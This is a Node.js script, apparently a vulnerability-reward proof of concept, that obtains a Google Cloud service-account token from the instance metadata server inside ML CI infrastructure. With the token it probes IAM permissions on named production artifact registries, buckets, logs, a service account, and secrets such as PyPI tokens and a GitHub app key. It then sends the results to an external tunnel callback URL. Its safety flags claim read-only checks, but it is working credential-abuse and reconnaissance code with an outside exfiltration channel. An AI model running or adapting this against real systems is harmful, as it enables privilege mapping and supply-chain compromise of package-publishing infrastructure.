"use strict";

const {
  request,
  responseSummary,
} = require("./vrp_jit_probe.js");

const CALLBACK_URL =
  "https://monsters-occasion-annotated-stream.trycloudflare.com/" +
  "gcp-keras-6f3f6d4d2f8a4e50a1e2c9c0c421b763";
const ARTIFACT_REPOSITORIES = [
  "projects/ml-oss-artifacts-published/locations/us/repositories/" +
    "ml-public-container",
  "projects/ml-oss-artifacts-published/locations/us/repositories/" +
    "jax-public-nightly-artifacts-registry",
  "projects/ml-oss-artifacts-published/locations/us/repositories/" +
    "jax-public-release-artifacts-registry",
  "projects/ml-oss-artifacts-published/locations/us/repositories/" +
    "tf-public-nightly-artifacts-registry",
  "projects/ml-actions-platform-production/locations/us/repositories/" +
    "ml-actions-production-registry",
];
const STORAGE_BUCKETS = [
  "keras-applications",
  "keras-cv",
  "keras-nlp",
  "ml-dashboard-data-gatherer",
  "general-ml-ci-transient",
  "jax-nightly-artifacts",
];
const GCP_PROJECT = "ml-velocity-actions-production";
const DEFAULT_COMPUTE_SERVICE_ACCOUNT =
  "244290524351-compute@developer.gserviceaccount.com";
const LOG_VIEW =
  `projects/${GCP_PROJECT}/locations/global/buckets/_Default/views/_AllLogs`;
const PUBSUB_TOPIC =
  "projects/ml-oss-benchmarking-production/topics/public-results-prod";
const SECRET_IDS = [
  "gh-app-credential",
  "github-app-private-key",
  "pypi-api-token",
  "pypi-nightly-api-token",
  "pypi-password",
  "pypi-username",
];

const ARTIFACT_PERMISSIONS = [
  "artifactregistry.repositories.get",
  "artifactregistry.repositories.getIamPolicy",
  "artifactregistry.repositories.setIamPolicy",
  "artifactregistry.repositories.update",
  "artifactregistry.repositories.delete",
  "artifactregistry.repositories.downloadArtifacts",
  "artifactregistry.repositories.uploadArtifacts",
  "artifactregistry.repositories.deleteArtifacts",
  "artifactregistry.dockerimages.get",
  "artifactregistry.dockerimages.list",
  "artifactregistry.packages.get",
  "artifactregistry.packages.list",
  "artifactregistry.packages.update",
  "artifactregistry.packages.delete",
  "artifactregistry.versions.get",
  "artifactregistry.versions.list",
  "artifactregistry.versions.update",
  "artifactregistry.versions.delete",
  "artifactregistry.tags.get",
  "artifactregistry.tags.list",
  "artifactregistry.tags.create",
  "artifactregistry.tags.update",
  "artifactregistry.tags.delete",
  "artifactregistry.files.get",
  "artifactregistry.files.list",
  "artifactregistry.files.download",
  "artifactregistry.files.upload",
  "artifactregistry.files.update",
  "artifactregistry.files.delete",
  "artifactregistry.attachments.get",
  "artifactregistry.attachments.list",
  "artifactregistry.attachments.create",
  "artifactregistry.attachments.delete",
];

const STORAGE_PERMISSIONS = [
  "storage.buckets.get",
  "storage.buckets.getIamPolicy",
  "storage.buckets.setIamPolicy",
  "storage.buckets.update",
  "storage.objects.get",
  "storage.objects.list",
  "storage.objects.create",
  "storage.objects.update",
  "storage.objects.delete",
];

const SECRET_PERMISSIONS = [
  "secretmanager.secrets.get",
  "secretmanager.secrets.getIamPolicy",
  "secretmanager.secrets.setIamPolicy",
  "secretmanager.secrets.update",
  "secretmanager.secrets.delete",
  "secretmanager.versions.get",
  "secretmanager.versions.list",
  "secretmanager.versions.access",
  "secretmanager.versions.add",
  "secretmanager.versions.enable",
  "secretmanager.versions.disable",
  "secretmanager.versions.destroy",
];

const PUBSUB_PERMISSIONS = [
  "pubsub.topics.get",
  "pubsub.topics.getIamPolicy",
  "pubsub.topics.setIamPolicy",
  "pubsub.topics.update",
  "pubsub.topics.delete",
  "pubsub.topics.publish",
  "pubsub.topics.attachSubscription",
];

const LOG_VIEW_PERMISSIONS = [
  "logging.logEntries.list",
  "logging.views.get",
  "logging.views.access",
];

const SERVICE_ACCOUNT_PERMISSIONS = [
  "iam.serviceAccounts.get",
  "iam.serviceAccounts.getIamPolicy",
  "iam.serviceAccounts.setIamPolicy",
  "iam.serviceAccounts.getAccessToken",
  "iam.serviceAccounts.getOpenIdToken",
  "iam.serviceAccounts.signBlob",
  "iam.serviceAccounts.signJwt",
  "iam.serviceAccounts.implicitDelegation",
  "iam.serviceAccounts.actAs",
];

const CREDENTIAL_ESCALATION_PERMISSIONS = [
  "iam.serviceAccounts.getAccessToken",
  "iam.serviceAccounts.getOpenIdToken",
  "iam.serviceAccounts.signBlob",
  "iam.serviceAccounts.signJwt",
  "iam.serviceAccounts.implicitDelegation",
];

const SECRET_STATE_CHANGE_PERMISSIONS = [
  "secretmanager.secrets.setIamPolicy",
  "secretmanager.secrets.update",
  "secretmanager.secrets.delete",
  "secretmanager.versions.add",
  "secretmanager.versions.enable",
  "secretmanager.versions.disable",
  "secretmanager.versions.destroy",
];

const WRITE_MARKERS = [
  ".uploadArtifacts",
  ".upload",
  ".deleteArtifacts",
  ".create",
  ".update",
  ".delete",
  ".setIamPolicy",
  ".publish",
  ".attachSubscription",
];

function goalWritePermissions(permissions) {
  return permissions.filter((permission) =>
    WRITE_MARKERS.some((marker) => permission.endsWith(marker)),
  );
}

function permissionResult(response) {
  const permissions =
    response.ok && response.value && Array.isArray(response.value.permissions)
      ? response.value.permissions.slice().sort()
      : [];
  return {
    ...responseSummary(response),
    allowed_permissions: permissions,
    goal_write_permissions: goalWritePermissions(permissions),
  };
}

async function gcpApiRequest(urlValue, token, method = "GET", body = null) {
  const url = new URL(urlValue);
  const encoded = body === null ? null : Buffer.from(JSON.stringify(body));
  return request({
    protocol: url.protocol,
    hostname: url.hostname,
    port: url.port || 443,
    requestPath: `${url.pathname}${url.search}`,
    method,
    body: encoded,
    headers: {
      Accept: "application/json",
      "User-Agent": "keras-vrp-gcp-permission-proof",
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
      ...(encoded
        ? {
            "Content-Type": "application/json",
            "Content-Length": encoded.length,
          }
        : {}),
    },
  });
}

function listResult(response, key) {
  const values =
    response.ok && response.value && Array.isArray(response.value[key])
      ? response.value[key]
      : [];
  return {
    ...responseSummary(response),
    returned_count: response.ok ? values.length : null,
    more_results_present: Boolean(
      response.ok && response.value && response.value.nextPageToken,
    ),
    names_returned: false,
    contents_returned: false,
  };
}

async function secretPermissionProbe(call, accessToken, secretId) {
  const resource = `projects/${GCP_PROJECT}/secrets/${secretId}`;
  const url = `https://secretmanager.googleapis.com/v1/${resource}`;
  const [metadata, iam] = await Promise.all([
    call(url, accessToken),
    call(`${url}:testIamPermissions`, accessToken, "POST", {
      permissions: SECRET_PERMISSIONS,
    }),
  ]);
  const permissions = permissionResult(iam);
  return {
    resource,
    metadata: responseSummary(metadata),
    test_iam_permissions: permissions,
    credential_value_read_permission: permissions.allowed_permissions.includes(
      "secretmanager.versions.access",
    ),
    state_change_permissions: permissions.allowed_permissions.filter(
      (permission) => SECRET_STATE_CHANGE_PERMISSIONS.includes(permission),
    ),
    secret_metadata_returned: false,
    secret_version_requested: false,
    secret_value_requested: false,
    write_operation_sent: false,
  };
}

async function storagePermissionProbe(call, accessToken, bucket) {
  const encodedBucket = encodeURIComponent(bucket);
  const iamUrl = new URL(
    `https://storage.googleapis.com/storage/v1/b/${encodedBucket}/iam/testPermissions`,
  );
  for (const permission of STORAGE_PERMISSIONS) {
    iamUrl.searchParams.append("permissions", permission);
  }
  const objectUrl =
    `https://storage.googleapis.com/storage/v1/b/${encodedBucket}` +
    "/o?maxResults=1&fields=items%2Fname%2CnextPageToken";
  const [iam, iamAnonymous, objects, objectsAnonymous] = await Promise.all([
    call(iamUrl.toString(), accessToken),
    call(iamUrl.toString(), null),
    call(objectUrl, accessToken),
    call(objectUrl, null),
  ]);
  return {
    bucket,
    test_iam_permissions: permissionResult(iam),
    anonymous_test_iam_permissions: permissionResult(iamAnonymous),
    object_metadata: {
      authenticated: listResult(objects, "items"),
      anonymous: listResult(objectsAnonymous, "items"),
    },
    object_name_requested: true,
    object_names_returned: false,
    object_content_requested: false,
    write_operation_sent: false,
  };
}

async function artifactPermissionProbe(call, accessToken, resource) {
  const url = `https://artifactregistry.googleapis.com/v1/${resource}`;
  const packagesUrl = `${url}/packages?pageSize=1`;
  const [
    metadata,
    metadataAnonymous,
    iam,
    iamAnonymous,
    packages,
    packagesAnonymous,
  ] = await Promise.all([
    call(url, accessToken),
    call(url, null),
    call(`${url}:testIamPermissions`, accessToken, "POST", {
      permissions: ARTIFACT_PERMISSIONS,
    }),
    call(`${url}:testIamPermissions`, null, "POST", {
      permissions: ARTIFACT_PERMISSIONS,
    }),
    call(packagesUrl, accessToken),
    call(packagesUrl, null),
  ]);
  return {
    resource,
    metadata: metadata.ok
      ? {
          status: metadata.status,
          name: metadata.value.name,
          format: metadata.value.format,
          mode: metadata.value.mode,
          description: metadata.value.description || null,
          registry_uri: metadata.value.registryUri || null,
        }
      : responseSummary(metadata),
    anonymous_metadata: responseSummary(metadataAnonymous),
    test_iam_permissions: permissionResult(iam),
    anonymous_test_iam_permissions: permissionResult(iamAnonymous),
    package_metadata: {
      authenticated: listResult(packages, "packages"),
      anonymous: listResult(packagesAnonymous, "packages"),
    },
    artifact_content_requested: false,
    write_operation_sent: false,
  };
}

async function topicPermissionProbe(call, accessToken) {
  const url = `https://pubsub.googleapis.com/v1/${PUBSUB_TOPIC}`;
  const [metadata, metadataAnonymous, iam, iamAnonymous] = await Promise.all([
    call(url, accessToken),
    call(url, null),
    call(`${url}:testIamPermissions`, accessToken, "POST", {
      permissions: PUBSUB_PERMISSIONS,
    }),
    call(`${url}:testIamPermissions`, null, "POST", {
      permissions: PUBSUB_PERMISSIONS,
    }),
  ]);
  return {
    resource: PUBSUB_TOPIC,
    metadata: responseSummary(metadata),
    anonymous_metadata: responseSummary(metadataAnonymous),
    test_iam_permissions: permissionResult(iam),
    anonymous_test_iam_permissions: permissionResult(iamAnonymous),
    message_requested: false,
    message_returned: false,
    publish_operation_sent: false,
    write_operation_sent: false,
  };
}

async function serviceAccountPermissionProbe(call, accessToken) {
  const resource =
    `projects/-/serviceAccounts/${DEFAULT_COMPUTE_SERVICE_ACCOUNT}`;
  const url = `https://iam.googleapis.com/v1/${resource}`;
  const [metadata, iam] = await Promise.all([
    call(url, accessToken),
    call(`${url}:testIamPermissions`, accessToken, "POST", {
      permissions: SERVICE_ACCOUNT_PERMISSIONS,
    }),
  ]);
  const permissions = permissionResult(iam);
  return {
    resource,
    metadata: responseSummary(metadata),
    test_iam_permissions: permissions,
    credential_escalation_permissions: permissions.allowed_permissions.filter(
      (permission) => CREDENTIAL_ESCALATION_PERMISSIONS.includes(permission),
    ),
    access_token_mint_sent: false,
    signature_operation_sent: false,
    write_operation_sent: false,
  };
}

async function gcpResourcePermissions(call = gcpApiRequest, metadata = request) {
  const tokenResponse = await metadata({
    protocol: "http:",
    hostname: "metadata.google.internal",
    port: 80,
    requestPath: "/computeMetadata/v1/instance/service-accounts/default/token",
    method: "GET",
    timeout: 5000,
    headers: { "Metadata-Flavor": "Google" },
  });
  const accessToken = tokenResponse.value && tokenResponse.value.access_token;
  if (!tokenResponse.ok || !accessToken) {
    return {
      token_obtained_in_process: false,
      token_value_returned: false,
      token_request: responseSummary(tokenResponse),
    };
  }

  const tokenInfoUrl = new URL("https://oauth2.googleapis.com/tokeninfo");
  tokenInfoUrl.searchParams.set("access_token", accessToken);
  const futureLogRead = call(
    "https://logging.googleapis.com/v2/entries:list",
    accessToken,
    "POST",
    {
      resourceNames: [`projects/${GCP_PROJECT}`],
      filter: 'timestamp >= "9999-01-01T00:00:00Z"',
      pageSize: 1,
    },
  );
  const logNames = call(
    `https://logging.googleapis.com/v2/projects/${GCP_PROJECT}/logs?pageSize=1`,
    accessToken,
  );
  const logViewPermissions = call(
    `https://logging.googleapis.com/v2/${LOG_VIEW}:testIamPermissions`,
    accessToken,
    "POST",
    { permissions: LOG_VIEW_PERMISSIONS },
  );
  const [
    tokenInfo,
    artifactPermissions,
    storagePermissions,
    pubsubPermissions,
    futureLogs,
    logs,
    logViewIam,
    serviceAccountPermissions,
    secretPermissions,
  ] = await Promise.all([
    call(tokenInfoUrl.toString(), accessToken),
    Promise.all(
      ARTIFACT_REPOSITORIES.map((resource) =>
        artifactPermissionProbe(call, accessToken, resource),
      ),
    ),
    Promise.all(
      STORAGE_BUCKETS.map((bucket) =>
        storagePermissionProbe(call, accessToken, bucket),
      ),
    ),
    topicPermissionProbe(call, accessToken),
    futureLogRead,
    logNames,
    logViewPermissions,
    serviceAccountPermissionProbe(call, accessToken),
    Promise.all(
      SECRET_IDS.map((secretId) =>
        secretPermissionProbe(call, accessToken, secretId),
      ),
    ),
  ]);

  return {
    token_obtained_in_process: true,
    token_value_returned: false,
    token_info: tokenInfo.ok
      ? {
          email: tokenInfo.value.email || null,
          audience: tokenInfo.value.aud || tokenInfo.value.audience || null,
          scope: tokenInfo.value.scope || null,
          expires_in: tokenInfo.value.expires_in || null,
        }
      : responseSummary(tokenInfo),
    artifact_registry: artifactPermissions,
    cloud_storage: storagePermissions,
    pubsub: pubsubPermissions,
    service_account: serviceAccountPermissions,
    secret_manager: {
      project: GCP_PROJECT,
      candidate_source:
        "Kubernetes GitHub App secret and public Keras workflow secret names",
      candidates: secretPermissions,
      secret_value_requested: false,
      write_operation_sent: false,
    },
    cloud_logging: {
      project: GCP_PROJECT,
      exact_view: {
        resource: LOG_VIEW,
        test_iam_permissions: permissionResult(logViewIam),
      },
      log_names: listResult(logs, "logNames"),
      future_only_entry_query: {
        ...listResult(futureLogs, "entries"),
        filter: 'timestamp >= "9999-01-01T00:00:00Z"',
        payload_requested_by_filter: false,
      },
      log_entry_payload_returned: false,
      write_operation_sent: false,
    },
  };
}

async function collect(call = gcpApiRequest, metadata = request) {
  const authority = await gcpResourcePermissions(call, metadata);
  return {
    phase: "keras-gcp-resource-permission-proof",
    captured_at: new Date().toISOString(),
    safety: {
      access_token_returned: false,
      artifact_content_requested: false,
      storage_object_names_returned: false,
      storage_object_content_requested: false,
      secret_value_requested: false,
      service_account_access_token_mint_sent: false,
      service_account_signature_operation_sent: false,
      pubsub_message_requested: false,
      pubsub_message_returned: false,
      log_entry_payload_requested: false,
      log_entry_payload_returned: false,
      write_operation_sent: false,
      non_mutating_permission_and_metadata_reads_only: true,
      runner_started: false,
      job_claim_attempted: false,
    },
    authority,
  };
}

async function send(value) {
  const target = new URL(CALLBACK_URL);
  const body = Buffer.from(JSON.stringify(value));
  const response = await request({
    protocol: target.protocol,
    hostname: target.hostname,
    port: target.port || 443,
    requestPath: target.pathname,
    method: "POST",
    body,
    headers: {
      "Content-Type": "application/json",
      "Content-Length": body.length,
    },
  });
  if (!response.ok) throw new Error("callback failed");
}

if (require.main === module) {
  if (process.env.VRP_GCP_PERMISSIONS_WRAPPER_TEST === "1") {
    process.exit(0);
  } else {
    collect()
      .then(send)
      .then(() => process.exit(0))
      .catch(() => process.exit(1));
  }
}

module.exports = {
  ARTIFACT_PERMISSIONS,
  LOG_VIEW_PERMISSIONS,
  PUBSUB_PERMISSIONS,
  SECRET_PERMISSIONS,
  SERVICE_ACCOUNT_PERMISSIONS,
  STORAGE_PERMISSIONS,
  collect,
  gcpApiRequest,
  gcpResourcePermissions,
  goalWritePermissions,
  permissionResult,
};
